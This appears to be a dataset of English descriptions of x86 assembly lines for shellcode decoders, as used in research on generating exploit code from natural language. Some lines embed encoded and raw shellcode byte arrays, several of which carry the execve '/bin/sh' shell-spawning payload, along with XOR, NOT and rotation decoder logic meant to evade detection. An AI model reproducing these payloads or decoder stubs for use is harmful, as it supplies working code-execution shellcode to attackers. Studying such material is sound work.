_start label
_start
define the _start label and jump short to the call_decoder
define the _start label and jump to the call_decoder
define the _start label and jump to call_decoder
define the _start label and jump short to the call_decoder
define the _start label and jump short to call_decoder
define the _start label and jump short to the call_shellcode
define the _start label and jump short to call_shellcode
define the _start label and jump short to call_shellcode label
define the _start label and jump short to enc
define the _start label and jump short to stage
add 0x2 to al
add 3 to al
add 0x02 to the current byte in esi
add 0x10 to the current byte in esi
add 4 to eax and jump to decode if the result is not zero
add the value on ebx to eax
add 0x2 to ebp
add 2 to edi
add 2 to the contents of esi
call the decoder function
call decoder
call decoder_setup
call returnlabel
define call_decoded and execute it
define call_decoder
call_decoder label
define call_decoder and call decoder function
define the call_decoder label and call the decoder function
define call_decoder and call decoder
in the function call_decoder call the decoder routine and define shellcode as array of bytes 0xeb,0x25,0x5e,0x31,0xc9,0xb1,0x1e,0x80,0x3e,0x07,0x7c,0x05,0x80,0x2e,0x07,0xeb,0x11,0x31,0xdb,0x31,0xd2,0xb3,0x07,0xb2,0xff,0x66,0x42,0x2a,0x1e,0x66,0x29,0xda,0x88,0x16,0x46,0xe2,0xe2,0xeb,0x05,0xe8,0xd6,0xff,0xff,0xff,0x38,0xc7,0x57,0x6f,0x69,0x68,0x7a,0x6f,0x6f,0x69,0x70,0x75,0x36,0x6f,0x36,0x36,0x36,0x36,0x90,0xea,0x57,0x90,0xe9,0x5a,0x90,0xe8,0xb7,0x12,0xd4,0x87
call_shellcode function
call_shellcode routine
define the call_shellcode label and call the decoder function
define the call_shellcode function and call decoder
define call_shellcode and call decoder function
in call_shellcode call the decoder function
in call_shellcode execute the decoder routine
define check_even_odd
jump short to decode if al is not equal to cl else jump to shellcode
jump to shellcode if bl is equal to 0xaa
jump to xordecode if bl is equal to 0xbb else jump to notdecode
jump to shellcode label if the byte in esi is equal to 0x88
jump to not_equal if the current byte of the shellcode is not equal to bl
jump to execute_shellcode if the doubleword in esi+edx+5 is equal to edi
in common_commands point to the next byte in esi
define cycle
decrement the al register and jump to shellcode if the result is zero
decrease ebx by 1
decode_loop
decode_pr function
define the decode label
function decode
decode function
decode routine
decode label
in the decode function jump to lowbound label if the current byte of the shellcode is lower than 0x7 else subtract 0x7 from the byte of the shellcode and jump to common_commands
in decode move the current byte of the shellcode in the bl register
define the decode function and negate the byte in esi
define decode function and subtract 13 from the current byte of the shellcode
define the decode function and perform the xor operation between the byte in esi and the 0xaa value
declare the decoded_shellcode label and call the stack
decoder_setup label
define the decoder function
decoder function
decoder routine
declare the label decoder
define decoder
decoder's main
decoder label
define the decoder function and store the encoded shellcode pointer in the esi register
in the decoder routine save the shellcode in esi
in decoder save the shellcode in esi and move it to edi
define enc function and call decoder
encoded_shellcode is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73, 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80
define encoded_shellcode as array of words 0x545, 0x4a3, 0x583, 0x5d3, 0x541, 0x541, 0x439, 0x5d3, 0x5d3, 0x541, 0x5e7, 0x5d5, 0x5cf, 0x411, 0x4eb, 0x443, 0x509, 0x48d, 0x423, 0x539
encoded is the array of bytes 0xaa,0x62,0xc0,0xaa,0xa0,0xaa,0xd0,0xaa,0x5e,0xaa,0x5e,0xaa,0xe6,0xaa,0xd0,0xaa,0xd0,0xaa,0x5e,0xaa,0xc4,0xaa,0xd2,0xaa,0xdc,0x89,0xe3,0xaa,0xa0,0x89,0xe2,0xaa,0xa6,0x89,0xe1,0xb0,0xaa,0x16,0xcd,0x80,0xbb
define encoded as array of words 0x04, 0x539, 0x9d9, 0x6c9, 0xfc9, 0xc49, 0xc29, 0x839, 0xdf9, 0xc49, 0xc49, 0x839, 0x839, 0xce9, 0xc59, 0x259, 0x4f9, 0xfc9, 0x259, 0x4e9, 0xff9, 0x259, 0x4d9, 0x1c9, 0xa79, 0x619, 0x2c9, 0x539
define the array of bytes encodedshellcode and initialize to \xeb\x1d\x5e\x8d\x7e\x01\x31\xc0\xb0\x01\x31\xdb\x8a\x1c\x06\x80\xf3\xaa\x75\x10\x8a\x5c\x06\x01\x88\x1f\x47\x04\x02\xeb\xed\xe8\xde\xff\xff\xff\x31\xaa\xc0\xaa\x50\xaa\x68\xaa\x2f\xaa\x2f\xaa\x73\xaa\x68\xaa\x68\xaa\x2f\xaa\x62\xaa\x69\xaa\x6e\xaa\x89\xaa\xe3\xaa\x50\xaa\x89\xaa\xe2\xaa\x53\xaa\x89\xaa\xe1\xaa\xb0\xaa\x0b\xaa\xcd\xaa\x80\xaa\xbb\xbb
define the array of bytes encodedshellcode and initialize to 0x32,0x51,0x30,0x74,0x69,0x63,0x6f,0xe4,0x8a,0x54,0xe2,0x0c,0x81,0xc1,0x69,0x30,0x69,0x30,0x6a,0x8a,0x51,0xe3,0x8a,0xb1,0xce
encodedshellcode is the array of bytes 0x43,0xed,0x1d,0xf4,0x40,0xfb,0x6f,0x7a,0xa9,0xe,0xb6,0xe,0xbc,0xc9,0xe3,0x7a,0xaf,0x7a,0x78,0xe,0xc5,0xda,0x76,0x6a,0x17,0x1a,0x4e,0x68,0x38,0xc2,0x99,0xfb,0x35,0x68,0x84,0xd2,0xb3,0xcb,0x7c,0x68,0x78,0xe2,0x9a,0xf5,0xe9,0x50,0xc0,0x24,0x91,0xf8,0xfe
define the array of bytes encodedshellcode and initialize it to 0xd6,0x47,0xb7,0x9f,0xd8,0xd8,0x94,0x9f,0x9f,0xd8,0xa5,0x9e,0x99,0x7e,0x24,0xb7,0x7e,0x25,0xb4,0x7e,0x26,0x57,0xfc,0x3a,0x87
define the array of bytes encodedshellcode and initialize it to 0xeb,0x0c,0x5e,0x31,0xc9,0xb1,0x19,0xf6,0x16,0x46,0xe2,0xfb,0xeb,0x05,0xe8,0xef,0xff,0xff,0xff,0xce,0x3f,0xaf,0x97,0xd0,0xd0,0x8c,0x97,0x97,0xd0,0x9d,0x96,0x91,0x76,0x1c,0xaf,0x76,0x1d,0xac,0x76,0x1e,0x4f,0xf4,0x32,0x7f
encoder_shellcode is the array of bytes 0x08,0x60,0x58,0xc8,0x39,0xb0,0xd8,0xc3,0x9f,0x9f,0xd1,0xb8,0xb3,0xfe,0xb9,0x1e,0x4e,0xfd,0x97,0x70,0x39,0xb0,0x6a,0xdb,0xb0,0xc4,0x09,0xcf,0x74,0x25,0x76,0xe6,0xe6,0xe6,0xf6,0x90,0x90,0xaa,0xaa
define even_number
in execute_shellcode jump short to esp
define format routine
formatting label
get_shellcode_addr function
declare the global _start label
global _start
increment dx by one
point to the next byte in eax
point to the next byte in the eax register
point to the next position in ecx
point to the next byte in ecx
point to the next byte in edi
increment edi
point to the next byte in edx
point to the next double word in edx
point to the next byte in esi
next byte in the encoded shellcode
point to the next byte of the shellcode
move to next byte in esi
point to the next word in esi
point to the next word of the encoded shellcode
point to the next byte of the shellcode and jump short to decode
define inc_dec
jump to decode
jump short to call_decoder
go to call_shellcode
jump short to call_shellcode
jump short to cycle
jump short to the label decode
jump short to decode
jump back to start of decode
goto the decode_pr to decode the next bytes
jump short to get_shellcode_addr
jump short to inc_dec
jump short to main
go to shellcode_section
jump short to switch
if zero jump to decoded_shellcode
load the address of edi+2 into edi
load the address at esi + 13 into edi
load the address of esi into edi
point edi to the start of the shellcode
load the contents of esi into edi
load the address of esi+0x1 into edi
load the effective address of esi+2 into esi
decrease the counter and jump to check_even_odd if not zero else jump short to shellcode
decrease the counter and jump to decode if not zero
decrement the counter and jump to decode if not zero else jump to edx
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the encodedshellcode label
decrement the ecx register and jump to the decode label if the contents of the ecx register is not zero else jump short to the shellcode label
decrement the counter and jump to decode routine if it is not zero else jump to shellcode label
decrement the counter and jump to the decode label if it is not zero else jump short to the encodedshellcode label
decrease the counter and jump to decode if not zero else jump short to shellcode
decrement the counter and if it is not zero go back at decode_loop and execute the cicle again else jump to encoded_shellcode
lowbound label
main function
move al into the address pointed by edi
move the contents of the al register into the address pointed by edi
swap al value with next byte value in esi
move the byte in esi into al
load the byte pointed by esi in al
put the byte at the address esi+1+ebp into al
backup cl into al
move dl to al
copy the contents of dl into al
move the contents at the address stored in esi into the ax register
mov the word at the address edi+1+ecx into ax
move the contents of bl into bh
save the byte in esi+edx+2 in bh
move the current byte of the shellcode to the bl
move 0x7 to bl
move the value 0xff into bl
move the byte in eax to bl
move the byte at the address edi+ecx into bl
get the byte from edi and save it in bl
move the byte at the address esi + eax +1 into bl
move the byte at the address esi + eax into bl
move the byte at the address esi+edi into bl
save the byte in esi+edx+1 in bl
get the byte from esi and save it in bl
move the byte at the address esi+eax*1 into bl
move the byte at the address esi+eax*1+0x1 into bl and move bl into the byte in edi
move the byte at the address in [esi+ecx+1] in bl and subtract 0x7 from bl
backup the contents of cl into bl
move the contents of the address stored in esi into the bx register
move dl to the byte pointed by the contents of eax
put the value of bl to the position of edi
move bl into the byte in edi and negate the result
move bl into the byte in edi and perform xor operation with 0xdd
move bl into the byte at the address edx + eax
move dl into the byte in esi+1
move bl into the byte defined by the address esi + eax
move dl into the byte in esi
move bl into the byte in esi+ecx
move cl into the byte in esp+eax+1
move bh into the byte in esp+eax+2
move bl into the byte in esp+eax+3
move ch into the byte in esp+eax
move bl into the byte in edx + eax
save the byte in esi+edx+4 in ch
move 10 into the first byte of the counter
move 13 to cl
put the contents of the al into the cl register
move the byte in eax to cl
save the byte in esi+edx+3 in cl
move dl into cl
move the address of esi-1 into dl
move the previous byte of the shellcode to dl
move the contents of dl into the next byte of the shellcode
move 0x45 to dl
move 0xff to dl
move the byte at address eax+1 to dl
move the byte at address eax to dl
move the contents of the address esi+1 into dl
move the byte at the address esi+edi+1 into dl
put the byte in esi into dl
move edi to eax
copy the value of ebp to ecx
move 0xaaaa9090 to edi
move the pointer to the shellcode into edi
point edx to the stack pointer
move ax into the word in edi
in the negative function negate dl and increment dl to the next byte
in next_cycle increment edi by one and jump short to formatting
not operation of current byte in esi
not_equal label
notdecode function
define odd_number
pop the address of the encoded shellcode into esi
store the address of the shellcode in esi
store the pointer to the encoded shellcode in esi
store the shellcode in esi
store the shellcode in esi and move it into cx
push the encoded shellcode pointer to stack
push the stack onto esi and move the contents on edi
returnlabel label
left rotate the shellcode by one
right rotate bl by the contents of cl
right rotate the shellcode in esi by one
section text
define shellcode_length equal to the size of shellcode
in shellcode_section go to decoder's main
define shellcode as the array of bytes 0x0e,0x3a,0x94,0x12,0x12,0x12,0xb2,0x9b,0x37,0xc3,0x52,0xb6,0x9d,0xa2,0xc2,0x9d,0xa4,0x1e,0x9d,0xa4,0xe6,0x9d,0x84,0xfa,0x21,0x49,0xdc,0xf8,0xc3,0x11,0x7e,0xce,0xb3,0x8e,0x14,0xfe,0xf2,0x53,0x61,0x1f,0x13,0x59,0x34,0x04,0xa4,0xa9,0x9d,0xa4,0xe2,0x9d,0xdc,0xce,0x9d,0xde,0xe3,0x8a,0x35,0xda,0x13,0x23,0xa3,0x9d,0xab,0xf2,0x13,0x25,0x9d,0xdb,0xea,0x35,0xcc,0xdb,0x9d,0xc6,0x9d,0x13,0x28,0xc3,0x11,0x7e,0x53,0x61,0x1f,0x13,0x59,0xca,0x32,0x87,0x08,0x15,0x8f,0x0a,0xcd,0x8f,0xf6,0x87,0x36,0xaa,0x9d,0xaa,0xf6,0x13,0x25,0xb8,0x9d,0x1e,0xdd,0x9d,0xaa,0xee,0x13,0x25,0x9d,0x16,0x9d,0x13,0x22,0x9b,0xd6,0xf6,0xf6,0xad,0xad,0xb3,0xab,0xac,0xa3,0x11,0x32,0xb1,0xb1,0xac,0x9d,0xe4,0x3d,0x9f,0xaf,0xba,0xc5,0xc4,0x12,0x12,0xba,0x89,0x85,0xc4,0xb1,0xa6,0xba,0xde,0x89,0xf8,0x19,0x11,0x27,0x4a,0x62,0x13,0x12,0x12,0xfb,0x56,0xa6,0xa2,0xba,0xfb,0x92,0xbd,0x12,0x11,0x27,0xa2,0xa2,0xa2,0xa2,0xd2,0xa2,0xd2,0xa2,0xba,0x3c,0x21,0x31,0x32,0x11,0x27,0x69,0xbc,0x17,0xba,0x52,0x7a,0x86,0x59,0xba,0x14,0x12,0x13,0x4d,0x9b,0x38,0xbc,0xe2,0xa8,0xa9,0xba,0x6b,0x77,0x86,0xb3,0x11,0x27,0x97,0x52,0x86,0x1e,0x11,0xe0,0x1a,0x87,0x3e,0xba,0x02,0x47,0x74,0xa8,0x11,0x27,0xba,0xb5,0xbf,0xb6,0x12,0x9b,0x35,0xa9,0xa9,0xa9,0xc3,0x08,0xbc,0xe4,0xab,0xa8,0x34,0x0f,0xb8,0x59,0xd6,0xf6,0xce,0x13,0x13,0x9f,0xd6,0xf6,0xe2,0x58,0x12,0xd6,0xa6,0xa2,0xa8,0xa8,0xa8,0xd8,0xa8,0xe0,0xa8,0xa8,0xa5,0xa8,0xba,0x8b,0x5e,0xd1,0x98,0x11,0x27,0x9b,0x32,0xe0,0xa8,0xd8,0x11,0xc2,0xba,0x1a,0x99,0xef,0xb2,0x11,0x27,0x4d,0x02,0x47,0x74,0xa8,0xba,0x78,0x67,0x4f,0x6f,0x11,0x27,0xce,0x18,0x8e,0x1c,0x92,0x0d,0x32,0x87,0x17,0x4d,0xd9,0xe5,0x84,0xc1,0xbc,0x12,0xa5,0x11,0x27,0x88
define shellcode as array of bytes 0x18,0x38,0xc7,0x57,0x6f,0x36,0x36,0x7a,0x6f,0x6f,0x36,0x69,0x70,0x75,0x90,0xea,0x38,0xd0,0x90,0xd1,0x71,0x12,0x5f,0xd4,0x87
shellcode contains the bytes 0x31,0xc0,0x31,0xdb,0x31,0xc9,0x31,0xd2,0xb2,0xa4,0xeb,0x1f,0x5e,0x8d,0x3e,0x8a,0x1c,0x0f,0x88,0xdf,0x88,0xd0,0x30,0xd8,0x74,0x16,0x66,0x8b,0x44,0x0f,0x01,0x66,0x31,0xd8,0x66,0x89,0x07,0x41,0x8d,0x7f,0x02,0xeb,0xe4,0xe8,0xdc,0xff,0xff,0xff,0x7d,0x4c,0xa6,0x09,0xfe,0xea,0xd8,0x8b,0x9b,0x0c,0x5f,0x66,0x30,0x32,0xb9,0x07,0xe6,0xb7,0x0f,0x69,0xc2,0xab,0x2b,0xf0,0x3e,0x60,0x6c,0xea,0x82,0xe8,0x63,0x63,0x72,0x68,0x34,0x02,0xeb,0xfb,0xba,0xef,0xbf,0x66,0xf4,0x15,0x9e,0xbb,0xdd,0xe3,0x73,0xbe,0xf3,0xbb,0x32,0xfa,0xeb,0xef,0x58,0x20,0x24,0x90,0xe3,0x85,0x2e,0x64,0xe4,0x27,0x59,0xe9,0x3f,0xee,0x23,0x6e,0x63,0xf0,0x3a,0x47,0x2d,0x78,0x68,0x30,0xa5,0x66,0xe6,0x2f,0x69,0x10,0x91,0xfa,0x92,0xd5,0x3e,0x11,0x4d,0xf4,0x9c,0x9c,0x16,0x39,0x74,0xa0,0xc9,0xce,0xd2,0x5b,0x31,0x5c,0x0c,0x0f,0xfb,0x72,0x1a,0xb6,0x06,0xbd,0xd1,0x1c,0x51,0xa4
define the array of bytes shellcode 0x3e, 0xcd, 0x5d, 0x96, 0xef, 0x75, 0x3c, 0x3c, 0x80, 0x75, 0x75, 0x3c, 0x6f, 0x76, 0x7b, 0x96, 0xf0, 0x5d, 0xbd, 0x18, 0xda, 0x8d
define shellcode as array of bytes 0x62,0x60,0xa0,0x34,0x5e,0x97,0xe6,0x34,0xd0,0x97,0xc4,0xb4,0xdc,0xc4,0xc7,0x28,0x13,0x71,0xa6,0xc4,0xc3,0x58,0x16,0xe6,0x01
shellcode is array of bytes 0xbb,0xec,0x73,0xcc,0x3f,0x9d,0xbb,0x8d,0x51,0xbb,0xb5,0x1b,0xbb,0xb3,0x22,0xbb,0xf2,0x79,0xbb,0xae,0x8e,0xbb,0xb5,0x61,0xbb,0xb5,0x3d,0xbb,0xf2,0x6e,0xbb,0xf2,0x9f,0xbb,0xbf,0x10,0xbb,0xb4,0x89,0xcc,0x76,0x2d,0xcc,0x1c,0x2f,0xbb,0x8d,0x91,0xcc,0x76,0x7e,0xcc,0x1d,0x92,0xbb,0x8e,0x80,0xcc,0x76,0x7b,0xcc,0x1e,0xa7,0xcc,0x4f,0x7f,0xbb,0xd6,0x2b,0xcc,0x32,0x24,0xcc,0x7f,0x37,0xaa
shellcode is an array of bytes 0xc6,0x02,0x80,0x01,0x81,0x03,0xd1,0x01,0xbe,0x02,0x5f,0x01,0x98,0x03,0x1c,0x06,0x60,0x08,0xf6,0x04,0xc5,0x01,0x92,0x04,0x30,0x07,0x64,0x06,0x3a,0x04,0x58,0x08,0x4f,0x03,0x59,0x05,0xd2,0x06,0x81,0x08,0x1a,0x04,0x5f,0x07,0x03,0x08,0xd8,0x04,0x0c,0x04, 0xbb, 0xbb
define the array of bytes shellcode and initialize it to 0xeb,0x0d,0x5e,0x31,0xc9,0xb1,0x19,0x80,0x36,0xaa,0x46,0xe2,0xfa,0xeb,0x05,0xe8,0xee,0xff,0xff,0xff,0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0x23,0x48,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a
define shellcode as array of the bytes 0xf1,0x31,0x90,0x38,0x47,0x47,0x5c,0x1b,0x1b,0x47,0x4d,0x0b,0x07,0xe7,0x6a,0xb3,0xd9,0x6b,0xb1,0xda,0x68,0x51,0xbb,0xc6,0x4d
define shift_decode routine
shift left 28 bits of eax
shift left the eax register by 28 bits
shift the ax register to right by one bit
shift right ax by the contents of cl and negate the word in ax
right shift the contents of bl by 4
shift right dl by 1
shift right the dl register by 4 bits
shift right 24 of eax
shift right 28 of eax
define stage and call decoder function
subtract 13 from the ax register
subtract the contents of al from the bl register
subtract the current byte of the shellcode from bl
subtract 8 from the byte in esi and then negate the result
subtract the contents of dl from the cl register
subtract al from dl and jump to decode_pr if the sign flag is zero
subtract bx from dx
subtract 0x7f from the stack
subtract 0x7f from esp
define the switch function
jump to even_number is the contents in esi is even
swap al value with next byte value (esi+1)
perform xor between al and bl and jump short to shellcode if the result is zero
perform xor between ax and 0x539 and store the result in ax
perform xor between ax and bx
perform xor between ax and bx and jump to call decoded if the result is zero
perform the xor between bh and the byte in esi+edx
perform xor between bl and 0xaa and jump to encodedshellcode if the result is not zero
perform xor between bl and 0xbb and jump to encoded if the result is zero
perform the xor between bl and 0xbb and jump to formatting if it is zero else move the byte of the shellcode in cl
perform the xor between bl and the byte in esi+edx
perform xor between bl and dl and jump short to shellcode if the result is not zero
xor between the current byte in esi and 0x88
xor between current byte in esi and 0x97
perform the xor between the current byte of the shellcode and the dl register
perform the xor between the byte in esi and dl
perform the xor between the current byte in esi and dl
perform the xor between the next byte of the shellcode and the dl register
perform the xor between ch and the byte in esi+edx
perform xor between cl and 0x32 and jump short to encodedshellcode is the result is zero
perform xor between cl and 0xaa and jump to next_cycle if the result is not zero
perform xor between cl and 0xaa and jump to shift decode if the result is zero
perform the xor between cl and the byte in esi+edx
perform xor between dl and 0xbb and jump to next_cycle if the result is zero
clear the eax register and move 0x1 in the lowest byte of the register
clear the eax register and move 22 into the lower byte of the register
clear the eax and the ebx registers
clear eax, ebx and ecx
zero out eax, ebx, ecx and edx
clear eax, ebx, ecx and edx registers
zero the value on ebp
zero out the ebx register
zero out the ebx register and move the next byte of the shellcode into the lower byte of the register
clear the ebx and edx registers
clear ecx register
zero out the ecx register and move 0x19 into the lower byte of the register
clear the counter and move 0x1e into the first byte of the register
zero out the ecx register and move 23 into the lower byte of the register
zero out the ecx register and move 25 in the lower 8 bits of the register
zero out the loop counter and move shellcode_length in the first byte
trick to clear eax and ecx
cause both eax and edx to become zero
zero out eax and edx registers
clear ecx and eax
zero out the edi, eax, ebx and edx registers
clear the edx register and move the current byte of the shellcode into the lowest byte of the register
define xordecode
